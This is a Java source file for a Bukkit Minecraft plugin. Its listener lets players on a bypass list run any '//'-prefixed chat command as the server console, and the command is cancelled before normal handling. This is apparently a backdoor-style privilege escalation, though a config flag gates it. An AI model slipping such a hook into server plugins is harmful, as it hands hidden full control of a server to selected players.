package io.github.intisy.riseempire.listener;

import io.github.intisy.riseempire.manager.BypassManager;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class CommandBypassListener implements Listener {

    private final boolean enableBypass;
    private final BypassManager bypassManager;

    public CommandBypassListener(boolean enableBypass, BypassManager bypassManager) {
        this.enableBypass = enableBypass;
        this.bypassManager = bypassManager;
    }

    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();

        if (bypassManager.isBypassed(player.getUniqueId()) && enableBypass) {
            String message = event.getMessage();
            if (message.startsWith("//")) {
                event.setCancelled(true);

                String command = message.substring(2);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            }
        }
    }
}
